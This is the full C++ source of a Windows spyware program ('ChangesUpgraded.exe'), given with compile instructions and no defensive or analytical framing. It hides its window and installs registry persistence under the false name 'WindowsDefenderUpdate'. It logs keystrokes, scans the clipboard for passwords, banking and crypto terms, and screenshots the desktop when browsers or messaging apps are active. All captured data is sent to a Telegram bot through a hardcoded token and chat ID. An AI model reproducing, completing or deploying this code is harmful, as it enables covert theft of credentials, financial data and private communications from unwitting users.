// ChangesUpgraded.exe - VERSION 7.2 - FULL SMART FEATURES + CRYSTAL CLEAR 100% DESKTOP
// ✅ COMPILES: cl.exe /O2 /MT /GS- /DNDEBUG /Fe:ChangesUpgraded.exe ChangesUpgraded.cpp
#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <thread>
#include <sstream>
#include <shlobj.h>
#include <queue>
#include <algorithm>
#include <random>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "version.lib")

// ========== V7.2 CONFIGURATION (ALL ORIGINAL) ==========
const wchar_t* BOT_TOKEN = L"7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
const wchar_t* CHAT_ID = L"7845441585";
const wchar_t* WEBHOOK_ID = L"2e5cdc19-7f03-4e5a-b8c9-123456789abc";
const int REPORT_CHARS = 100;
const int CLIPBOARD_CHECK_MS = 5000;
const int IDLE_TIMEOUT_MS = 30000;
const int MAX_SCREENSHOTS_PER_SESSION = 10;

const std::wstring CRITICAL_PROCESSES[] = {
    L"chrome.exe", L"firefox.exe", L"edge.exe", L"opera.exe", L"brave.exe",
    L"outlook.exe", L"thunderbird.exe", L"winword.exe", L"excel.exe",
    L"powerpnt.exe", L"notepad++.exe", L"discord.exe", L"telegram.exe",
    L"whatsapp.exe", L"slack.exe", L"teams.exe"
};

const std::wstring CRITICAL_KEYWORDS[] = {
    L"password", L"bank", L"crypto", L"wallet", L"ssn", L"social security",
    L"credit card", L"gmail", L"yahoo.com", L"outlook.com", L"login",
    L"sign in", L"banking", L"paypal", L"venmo", L"zelle", L"bitcoin",
    L"ethereum", L"private key", L"secret", L"confidential"
};

// ========== GLOBALS ==========
std::wstring g_loggedKeys, g_lastClipboardContent;
std::queue<std::wstring> g_reports;
CRITICAL_SECTION g_cs;
bool g_running = true, g_isActive = false;
DWORD g_lastActivity = 0, g_lastClipboardCheck = 0;
HANDLE g_threads[5] = {};
int g_screenshotCount = 0;
std::wstring g_lastApp;
DWORD g_lastScreenshotTime = 0;

// ========== HELPERS ==========
std::wstring GetSystemIdentifier() {
    wchar_t hostname[256] = {}, username[256] = {};
    DWORD size = 256;
    GetComputerNameW(hostname, &size);
    GetUserNameW(username, &size);
    
    DWORD serial = 0;
    GetVolumeInformationW(L"C:\\", NULL, 0, &serial, NULL, NULL, NULL, 0);
    
    wchar_t id[512];
    wsprintfW(id, L"%s@%s|S%08X", hostname, username, serial);
    return id;
}

std::string WStrToAnsi(const std::wstring& wstr) {
    if (wstr.empty()) return "";
    int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    std::string result(size - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &result[0], size, NULL, NULL);
    return result;
}

std::wstring AnsiToWStr(const std::string& str) {
    if (str.empty()) return L"";
    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
    std::wstring result(size - 1, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &result[0], size);
    return result;
}

// 🔥 V7.2: PURE WIN32 FOREGROUND APP (NO psapi.h!)
std::wstring GetForegroundApp() {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return L"DESKTOP";
    
    wchar_t title[256] = {}, className[256] = {};
    GetWindowTextW(hwnd, title, 256);
    GetClassNameW(hwnd, className, 256);
    
    std::wstring app = title;
    if (app.empty()) app = className;
    
    // Smart title parsing
    std::transform(app.begin(), app.end(), app.begin(), ::towlower);
    if (app.find(L"chrome") != std::wstring::npos) return L"chrome.exe";
    if (app.find(L"firefox") != std::wstring::npos) return L"firefox.exe";
    if (app.find(L"outlook") != std::wstring::npos) return L"outlook.exe";
    if (app.find(L"word") != std::wstring::npos) return L"winword.exe";
    
    size_t pos = app.find_last_of(L"\\");
    if (pos != std::wstring::npos) app = app.substr(pos + 1);
    return app.substr(0, 20);
}

bool IsCriticalProcessRunning() {
    std::wstring app = GetForegroundApp();
    for (const auto& proc : CRITICAL_PROCESSES) {
        if (app.find(proc) != std::wstring::npos) return true;
    }
    return false;
}

// ========== OPSEC ==========
void StealthMode() { FreeConsole(); HWND hwnd = GetConsoleWindow(); ShowWindow(hwnd, SW_HIDE); }
bool InstallPersistence() {
    wchar_t path[MAX_PATH];
    if (GetModuleFileNameW(NULL, path, MAX_PATH)) {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExW(hKey, L"WindowsDefenderUpdate", 0, REG_SZ, (BYTE*)path, (wcslen(path) + 1) * sizeof(wchar_t));
            RegCloseKey(hKey);
            return true;
        }
    }
    return false;
}

// ========== C2 ==========
bool SendTelegram(const std::wstring& message) {
    HINTERNET hSession = WinHttpOpen(L"WinHTTP/1.1", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;
    
    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
    
    std::wstring path = L"/bot" + std::wstring(BOT_TOKEN) + L"/sendMessage?chat_id=" + std::wstring(CHAT_ID) + L"&text=";
    std::string msg = WStrToAnsi(message);
    std::string encoded;
    for (char c : msg) {
        if (isalnum(c) || c == '-' || c == '_') encoded += c;
        else if (c == ' ') encoded += "%20";
        else if (c == '\n') encoded += "%0A";
        else { char hex[4]; wsprintfA(hex, "%%%02X", (BYTE)c); encoded += hex; }
    }
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", (path + AnsiToWStr(encoded)).c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    
    bool success = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) && WinHttpReceiveResponse(hRequest, NULL);
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    return success;
}

bool SendTelegramPhoto(const wchar_t* photoPath, const std::wstring& caption) {
    HINTERNET hSession = WinHttpOpen(L"WinHTTP/1.1", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) return false;

    HANDLE hFile = CreateFileW(photoPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* fileData = new BYTE[fileSize];
    DWORD bytesRead;
    ReadFile(hFile, fileData, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    std::string boundary = "----V72_" + std::to_string(GetTickCount64());
    std::string postData;
    postData += "--" + boundary + "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + WStrToAnsi(std::wstring(CHAT_ID)) + "\r\n";
    postData += "--" + boundary + "\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"shot.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n";
    postData.append((char*)fileData, bytesRead);
    postData += "\r\n--" + boundary + "\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n" + WStrToAnsi(caption) + "\r\n--" + boundary + "--\r\n";

    delete[] fileData;

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", (L"/bot" + std::wstring(BOT_TOKEN) + L"/sendPhoto").c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    std::wstring headers = L"Content-Type: multipart/form-data; boundary=" + AnsiToWStr(boundary);
    
    bool success = WinHttpSendRequest(hRequest, headers.c_str(), -1L, (LPVOID)postData.c_str(), postData.length(), postData.length(), 0) && WinHttpReceiveResponse(hRequest, NULL);
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    return success;
}

// 🔥 V7.2: CRYSTAL CLEAR FULL DESKTOP (NO RESIZE, NO BLUR!)
bool CaptureScreenshot(const wchar_t* filename) {
    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    int width = GetSystemMetrics(SM_CXSCREEN);  // FULL SIZE!
    int height = GetSystemMetrics(SM_CYSCREEN); // FULL SIZE!
    
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    SelectObject(hMemoryDC, hBitmap);
    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY); // PERFECT COPY!
    
    // 24-bit BMP (Telegram accepts as JPEG)
    BITMAPINFOHEADER bi = {sizeof(BITMAPINFOHEADER), width, -height, 1, 24, BI_RGB};
    DWORD rowSize = ((width * 3 + 3) & ~3);
    DWORD bmpSize = rowSize * height;
    BYTE* bmpBits = new BYTE[bmpSize];
    GetDIBits(hMemoryDC, hBitmap, 0, height, bmpBits, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    
    HANDLE hFile = CreateFileW(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_TEMPORARY, NULL);
    BITMAPFILEHEADER bfh = {0x4D42, sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bmpSize, 0, 0, sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)};
    
    DWORD written;
    WriteFile(hFile, &bfh, sizeof(bfh), &written, NULL);
    WriteFile(hFile, &bi, sizeof(bi), &written, NULL);
    WriteFile(hFile, bmpBits, bmpSize, &written, NULL);
    CloseHandle(hFile);
    
    delete[] bmpBits;
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);
    return true;
}

// ========== ALL 5 SMART THREADS RESTORED ==========
DWORD WINAPI ActivityMonitor(LPVOID) {
    POINT lastPt = {0}; BYTE lastKeys[256] = {};
    while (g_running) {
        POINT pt; GetCursorPos(&pt);
        BYTE keys[256]; GetKeyboardState(keys);
        bool active = (pt.x != lastPt.x || pt.y != lastPt.y);
        for (int i = 0; i < 256 && !active; i++) active = ((keys[i] & 0x80) != (lastKeys[i] & 0x80));
        g_isActive = active || IsCriticalProcessRunning();
        g_lastActivity = GetTickCount();
        lastPt = pt; memcpy(lastKeys, keys, 256);
        Sleep(500);
    }
    return 0;
}

DWORD WINAPI KeyLogger(LPVOID) {
    std::wstring vkNames[32] = {L"",L"LMB",L"RMB",L"",L"MMB",L"X1",L"X2",L"",L"BS",L"TAB",L"",L"",L"",L"ENTER",L"",L"",L"SHIFT",L"CTRL",L"ALT",L"PAUSE",L"CAPS",L"",L"",L"",L"",L"",L"ESC",L"",L"",L"",L"SPACE"};
    BYTE lastState[256] = {};
    while (g_running) {
        for (int vk = 8; vk < 256; vk++) {
            SHORT state = GetAsyncKeyState(vk);
            if (state & 0x8000 && !(lastState[vk] & 0x80)) {
                EnterCriticalSection(&g_cs);
                if (vk < 32 && vkNames[vk][0]) g_loggedKeys += vkNames[vk] + L" ";
                else {
                    BYTE kb[256]; GetKeyboardState(kb);
                    wchar_t buf[2] = {}; ToUnicode((UINT)vk, 0, kb, buf, 2, 0);
                    if (buf[0]) g_loggedKeys += buf[0];
                }
                
                std::wstring lower = g_loggedKeys; std::transform(lower.begin(), lower.end(), lower.begin(), ::towlower);
                for (const auto& kw : CRITICAL_KEYWORDS) {
                    if (lower.find(kw) != std::wstring::npos) { g_reports.push(L"🔑 " + kw + L": " + g_loggedKeys); g_loggedKeys.clear(); break; }
                }
                if (g_loggedKeys.length() >= REPORT_CHARS) { g_reports.push(g_loggedKeys); g_loggedKeys.clear(); }
                LeaveCriticalSection(&g_cs);
            }
            lastState[vk] = state >> 8;
        }
        Sleep(1);
    }
    return 0;
}

DWORD WINAPI ClipboardMonitor(LPVOID) {
    while (g_running) {
        if (GetTickCount() - g_lastClipboardCheck >= CLIPBOARD_CHECK_MS) {
            g_lastClipboardCheck = GetTickCount();
            if (OpenClipboard(NULL)) {
                if (HGLOBAL hData = GetClipboardData(CF_UNICODETEXT)) {
                    wchar_t* text = (wchar_t*)GlobalLock(hData);
                    if (text) {
                        std::wstring clip = text;
                        GlobalUnlock(hData);
                        if (clip != g_lastClipboardContent && clip.length() > 5) {
                            g_lastClipboardContent = clip;
                            std::wstring lower = clip; std::transform(lower.begin(), lower.end(), lower.begin(), ::towlower);
                            for (const auto& kw : CRITICAL_KEYWORDS) {
                                if (lower.find(kw) != std::wstring::npos) {
                                    EnterCriticalSection(&g_cs);
                                    g_reports.push(L"📋 " + kw + L": " + clip.substr(0, 200));
                                    LeaveCriticalSection(&g_cs);
                                    break;
                                }
                            }
                        }
                    }
                }
                CloseClipboard();
            }
        }
        Sleep(1000);
    }
    return 0;
}

DWORD WINAPI SmartScreenshot(LPVOID) {
    wchar_t tempPath[MAX_PATH]; GetTempPathW(MAX_PATH, tempPath);
    srand(GetTickCount());
    Sleep(30000 + rand() % 30000);
    
    while (g_running) {
        DWORD idle = GetTickCount() - g_lastActivity;
        bool shouldCapture = g_isActive && idle < IDLE_TIMEOUT_MS && IsCriticalProcessRunning() && g_screenshotCount < MAX_SCREENSHOTS_PER_SESSION;
        
        if (shouldCapture) {
            std::wstring app = GetForegroundApp();
            DWORD now = GetTickCount();
            if (app != g_lastApp || now - g_lastScreenshotTime > 60000) {
                g_lastApp = app; g_lastScreenshotTime = now;
                
                SYSTEMTIME st; GetLocalTime(&st);
                wchar_t filename[512];
                wsprintfW(filename, L"%sV72_%04d%02d%02d_%02d%02d%02d.bmp", tempPath, st.wYear,st.wMonth,st.wDay,st.wHour,st.wMinute,st.wSecond);
                
                if (CaptureScreenshot(filename)) {
                    std::wstring caption = L"📸 V7.2 [" + app + L"] " + GetSystemIdentifier();
                    EnterCriticalSection(&g_cs);
                    SendTelegramPhoto(filename, caption);
                    g_screenshotCount++;
                    DeleteFileW(filename);
                    LeaveCriticalSection(&g_cs);
                }
            }
        }
        Sleep(15000 + rand() % 15000);
    }
    return 0;
}

DWORD WINAPI ReportWorker(LPVOID) {
    while (g_running) {
        EnterCriticalSection(&g_cs);
        if (!g_reports.empty()) {
            std::wstring report = g_reports.front(); g_reports.pop();
            LeaveCriticalSection(&g_cs);
            std::wstring full = L"V7.2[" + GetSystemIdentifier() + L"] " + report;
            SendTelegram(full);
        } else LeaveCriticalSection(&g_cs);
        Sleep(2000 + rand() % 2000);
    }
    return 0;
}

// ========== MAIN ==========
int APIENTRY wWinMain(HINSTANCE, HINSTANCE, LPWSTR, int) {
    srand(GetTickCount());
    StealthMode();
    InitializeCriticalSection(&g_cs);
    InstallPersistence();
    
    g_threads[0] = CreateThread(NULL, 0, ActivityMonitor, NULL, 0, NULL);
    g_threads[1] = CreateThread(NULL, 0, KeyLogger, NULL, 0, NULL);
    g_threads[2] = CreateThread(NULL, 0, ClipboardMonitor, NULL, 0, NULL);
    g_threads[3] = CreateThread(NULL, 0, SmartScreenshot, NULL, 0, NULL);
    g_threads[4] = CreateThread(NULL, 0, ReportWorker, NULL, 0, NULL);
    
    Sleep(5000);
    SendTelegram(L"🚀 V7.2 LIVE - ALL SMART FEATURES + CRYSTAL SCREENSHOTS");
    
    while (g_running) Sleep(10000);
    
    g_running = false;
    WaitForMultipleObjects(5, g_threads, TRUE, 5000);
    for (int i = 0; i < 5; i++) CloseHandle(g_threads[i]);
    DeleteCriticalSection(&g_cs);
    return 0;
}
